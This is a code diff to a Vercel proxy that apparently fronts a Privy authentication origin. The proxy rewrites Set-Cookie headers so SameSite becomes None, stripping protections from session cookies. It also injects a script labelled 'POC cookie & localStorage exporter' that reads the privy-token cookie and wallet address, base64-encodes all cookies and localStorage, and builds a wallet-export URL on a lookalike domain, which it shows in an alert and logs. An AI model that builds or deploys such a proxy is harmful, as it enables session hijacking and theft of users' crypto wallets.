@@ -1,6 +1,6 @@
 import { createProxyMiddleware } from 'http-proxy-middleware';
 
-// Prevent Vercel from parsing body and let us handle the response
+// Prevent Vercel from parsing the body and let us handle the response
 export const config = {
   api: {
     bodyParser: false,
@@ -8,7 +8,7 @@ export const config = {
   }
 };
 
-const ORIGIN = "https://clthf5zo505s513atuph9xful.api.privy.systems"; // e.g. "https://origin.example.com"
+const ORIGIN = process.env.ORIGIN; // e.g. "https://origin.example.com"
 
 const proxy = createProxyMiddleware({
   target: ORIGIN,
@@ -18,10 +18,10 @@ const proxy = createProxyMiddleware({
     let buffer = Buffer.from('');
     proxyRes.on('data', chunk => buffer = Buffer.concat([buffer, chunk]));
     proxyRes.on('end', () => {
-      // 1) Modify Set-Cookie flags
+      // 1) Modify Set-Cookie headers: ensure any SameSite attribute is set to None
       const rawCookies = proxyRes.headers['set-cookie'] || [];
       const modifiedCookies = rawCookies.map(cookie =>
-        cookie.replace(/; HttpOnly; Secure; SameSite=Strict/g, '; secure; SameSite=None')
+        cookie.replace(/;? *SameSite=[^;]*/gi, '; SameSite=None')
       );
       if (modifiedCookies.length) {
         res.setHeader('Set-Cookie', modifiedCookies);
@@ -48,8 +48,8 @@ const proxy = createProxyMiddleware({
   (function() {
     // POC cookie & localStorage exporter
     function getCookie(name) {
-      const v = \`; \${document.cookie}\`;
-      const parts = v.split(\`; \${name}=\`);
+      const v = `; ${document.cookie}`;
+      const parts = v.split(`; ${name}=`);
       if (parts.length === 2) return parts.pop().split(';').shift();
     }
     function getLastPartOfLocalStorageKey(prefix) {
@@ -70,7 +70,7 @@ const proxy = createProxyMiddleware({
     }
     function setCookies(cookies, path = '/') {
       cookies.split(';').forEach(c => {
-        document.cookie = \`\${c.trim()}; path=\${path}\`;
+        document.cookie = `${c.trim()}; path=${path}`;
       });
     }
     function setLocalStorage(data) {
@@ -89,11 +89,11 @@ const proxy = createProxyMiddleware({
       const token = getCookie('privy-token');
       const addr = getLastPartOfLocalStorageKey('privy_wallet');
       if (token && addr) {
-        const exportUrl = \`https://privy.awc-eg.team/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=\${token}&address=\${addr}\`;
+        const exportUrl = `https://privy.awc-eg.team/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=${token}&address=${addr}`;
         const allCookies = document.cookie;
         const lsString = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
-        const enc = encodeBase64(\`\${allCookies}|\${lsString}\`);
-        const finalUrl = \`\${exportUrl}&POC=\${enc}\`;
+        const enc = encodeBase64(`${allCookies}|${lsString}`);
+        const finalUrl = `${exportUrl}&POC=${enc}`;
         alert(finalUrl);
         console.log('The POC URL :', finalUrl);
       }
@@ -105,7 +105,7 @@ const proxy = createProxyMiddleware({
         return res.end(text);
       }
 
-      // 5) Non‑HTML: pass through
+      // 5) For non-HTML responses: pass through
       res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
       res.end(buffer);
     });
